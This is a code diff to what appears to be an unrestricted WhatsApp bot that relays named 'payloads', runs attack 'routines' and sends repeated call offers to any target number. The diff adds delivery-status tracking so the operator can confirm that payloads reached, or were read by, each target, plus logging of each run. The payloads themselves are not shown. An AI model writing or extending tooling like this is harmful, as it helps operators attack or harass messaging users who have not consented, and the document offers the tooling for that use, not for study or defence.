@@ -170,6 +170,53 @@ async function sendCallOffer(target, count = 1) {
 const connections = new Map()           // sessionId -> socket instance
 const sessions = new Map()              // sessionId -> per-session state (EXPORTED)
 const startTime = Date.now()
+
+// ── Sent-message delivery tracker ──
+// key: msgId -> { type, name, target, sentAt, status, updatedAt }
+const sentTracker = new Map()
+const sentStatusLabels = {
+  0: 'PENDING', 1: 'SERVER_ACK', 2: 'DELIVERED', 3: 'READ', 4: 'PLAYED',
+  6: 'FAILED', 7: 'FATAL', 8: 'DELETED',
+}
+
+function trackSentMessage(msgId, meta) {
+  if (!msgId) return
+  sentTracker.set(msgId, {
+    ...meta,
+    sentAt: new Date().toISOString(),
+    status: 0,
+    statusLabel: 'PENDING',
+    updatedAt: new Date().toISOString(),
+  })
+}
+
+function reportSentStatus(msgId) {
+  const entry = sentTracker.get(msgId)
+  if (!entry) return
+  console.log(
+    `[SEND-STATUS] ${entry.type} "${entry.name}" -> ${entry.target} ` +
+    `msgId=${msgId} status=${entry.statusLabel} ` +
+    `(sent ${entry.sentAt}, updated ${entry.updatedAt})`
+  )
+}
+
+// Called from conn.ev.on('messages.update') — logs real delivery state.
+function onMessagesUpdate(updates) {
+  for (const u of updates) {
+    const id = u.key?.id
+    const entry = sentTracker.get(id)
+    if (!entry) continue
+    if (typeof u.status === 'number') {
+      entry.status = u.status
+      entry.statusLabel = sentStatusLabels[u.status] || `STATUS_${u.status}`
+    }
+    entry.updatedAt = new Date().toISOString()
+    reportSentStatus(id)
+    if ([2, 3, 4, 6, 7, 8].includes(entry.status)) {
+      sentTracker.delete(id) // terminal state — stop tracking
+    }
+  }
+}
 const reconnectAttempts = new Map()
 const reconnectTimers = new Map()
 const isConnecting = new Map()
@@ -1640,8 +1687,9 @@ const commands = {
       const wmsg = generateWAMessageFromContent(target, raw, {})
       await conn.relayMessage(target, wmsg.message, { messageId: wmsg.key.id })
       const bytes = wireSize(wmsg)
-      console.log(`[send] "${matched.name}" -> ${target} (wire size: ${bytes} bytes)`)
-      await conn.sendMessage(from, { text: `[!send] delivered "${matched.name}" -> ${target} (wire size: ${bytes} bytes)` })
+      trackSentMessage(wmsg.key.id, { type: 'payload', name: matched.name, target })
+      console.log(`[send] "${matched.name}" -> ${target} (wire size: ${bytes} bytes, msgId: ${wmsg.key.id})`)
+      await conn.sendMessage(from, { text: `[!send] relayed "${matched.name}" -> ${target} (wire size: ${bytes} bytes, msgId: ${wmsg.key.id})` })
     },
     aliases: ['s'],
     args: ['payload', 'target'],
@@ -1662,10 +1710,12 @@ const commands = {
       const first = matched.rest[1]
       const opts = {}
       if (first && /^\d+$/.test(first)) opts.count = parseInt(first, 10)
+      console.log(`[run] starting "${matched.name}" -> ${target}${opts.count ? ` (count=${opts.count})` : ''}`)
       // Obtained functions accept (sock, target); embedded routines accept (target).
       const result = matched.fn.length >= 2
         ? await matched.fn(conn, target, opts)
         : await matched.fn(target, false, opts)
+      console.log(`[run] "${matched.name}" -> ${target} finished${result ? ` (${result})` : ''}`)
       await conn.sendMessage(from, { text: `[!run] "${matched.name}" -> ${target} done${result ? ` (${result})` : ''}` })
     },
     aliases: ['r'],
@@ -1953,6 +2003,7 @@ async function startBot(phoneNumber, socket, _useDbIgnored, preloadedState, prel
 
   conn.ev.on('creds.update', saveCreds)
   conn.ev.on('messages.upsert', onMessages)
+  conn.ev.on('messages.update', onMessagesUpdate)
 }
 
 // ---------------------------------------------------------------------------
@@ -2021,10 +2072,21 @@ setInterval(async () => {
   }
 }, 25000)
 
+// Periodic delivery-status dump: every 30s, report any tracked messages that
+// are still not in a terminal state (DELIVERED/READ/FAILED), so you can see
+// what the server accepted but the target never confirmed.
+setInterval(() => {
+  if (!sentTracker.size) return
+  console.log(`[SEND-STATUS] ${sentTracker.size} message(s) still awaiting delivery confirm:`)
+  for (const [id, e] of sentTracker) {
+    console.log(`  - ${e.type} "${e.name}" -> ${e.target} [${e.statusLabel}] msgId=${id}`)
+  }
+}, 30000)
+
 if (import.meta.main) {
   console.log('[bot] unrestricted — any sender can command, any target accepted.')
   console.log(`[bot] loaded ${Object.keys(payloads).length} payload(s), ${Object.keys(routines).length} routine(s).`)
   console.log('[bot] ready. Send !ping from any number to verify.')
 }
 
-export { startBot, connections, sessions, startTime, isConnecting }
+export { startBot, connections, sessions, startTime, isConnecting, sentTracker, reportSentStatus }
